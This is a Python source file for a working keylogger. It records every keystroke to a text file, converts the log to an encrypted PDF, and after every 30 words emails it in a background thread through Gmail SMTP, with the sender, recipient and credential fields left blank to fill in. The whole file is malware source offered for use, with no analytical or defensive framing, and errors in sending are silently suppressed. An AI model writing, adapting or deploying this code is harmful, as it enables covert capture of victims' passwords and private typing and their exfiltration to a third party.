# ---------- LIBRARY ----------
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from threading import Thread
from email.mime.base import MIMEBase
from email import encoders


def convert(file_content):
    from fpdf import FPDF
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size = 15)
    pdf.cell(200, 10, txt = "KeyLoggerLog",ln = 1, align = 'C')
    max_lines = 70
    lines = [file_content[i:i + max_lines] for i in range(0, len(file_content), max_lines)]
    for line in lines:
        pdf.cell(200, 10, txt = line,ln = True, align = 'C')
    pdf.output("keyloggerlog.pdf") 


def encrypt():
    from pypdf import PdfReader, PdfWriter

    reader = PdfReader("keyloggerlog.pdf")

    writer = PdfWriter()
    writer.append_pages_from_reader(reader)
    writer.encrypt("")                      # Enter here the password for encrypting PDF

    with open("output.pdf", "wb") as out_file:
        writer.write(out_file)

# ---------- BackSpace Function (canc key)----------
def backspace():
    with open('keyloggerlog.txt', "r+") as file:
        content = file.read()
        new_content = content[:-1]  
        file.seek(0) 
        file.write(new_content)
        file.truncate()


# ---------- Send Mail Function with smtp library ----------
def send_email(subject, message, from_email, to_email, smtp_server, smtp_port, smtp_username, smtp_password,attachment_path=None):
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject
    msg.attach(MIMEText(message, 'plain'))

    if attachment_path:
        attachment = open(attachment_path, "rb")
        part = MIMEBase('application', 'octet-stream')
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', "attachment; filename= %s" % attachment_path)
        msg.attach(part)

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(smtp_username, smtp_password)
        server.sendmail(from_email, to_email, msg.as_string())
        server.quit()
        # Email sent successfully
    except Exception as e:
        pass
        # An error occurred

def content_file():
    file_path = "keyloggerlog.txt"  # Replace with the path to your file
    file_content = ""

    with open(file_path, "r") as file:
        file_content = file.read()

    return file_content

# ---------- Registrator Function ----------
def on_key_press(key):
    
    x = 0
    try:
        key_char = key.char
        key_char = str(key_char)
    except AttributeError:
        key_char = key
        key_char = str(key_char)
        if "Key.space" in key_char:
            key_char = ' '
        if "Key.backspace" in key_char:
            key_char = ''
            backspace()
        if "Key.enter" in key_char:
            key_char = '\n'    
            
# ---------- This function insert actual key in the file ----------
    with open('keyloggerlog.txt','a') as file:
        file.write(key_char)

# ---------- Count the words and at 30 send the mail ----------
    with open('keyloggerlog.txt','r') as file:
        for line in file:
            words = line.split()
            x += len(words)
    if x%30 == 0:                    # Enter every how many words you want to send the email, Defaul: 30
        if __name__ == "__main__":

            subject = "Keylogger log"        # Mail Subject
            message = ""                     # Mail message (None)
            message_crypt = content_file()   # Mail message (file keylogger)
            from_email = ""                  # From 
            to_email = ""                    # To
            smtp_server = "smtp.gmail.com"   # SMTP server (for example gmail)
            smtp_port = 587                  # Port (default 587)
            smtp_username = ""               # SMTP username
            smtp_password = ""               # SMTP password (guide in README)

            convert(message_crypt)           # Convert by .txt to .pdf
            encrypt()                        # Encrypt function on .pdf file

            attachment_path = "output.pdf"

            
            email_thread = Thread(target=send_email, args=(subject, message, from_email, to_email, smtp_server, smtp_port, smtp_username, smtp_password, attachment_path))
            email_thread.start()

            print("Email sending process started in the background.")

with keyboard.Listener(on_press=on_key_press) as listener:
    listener.join()
    
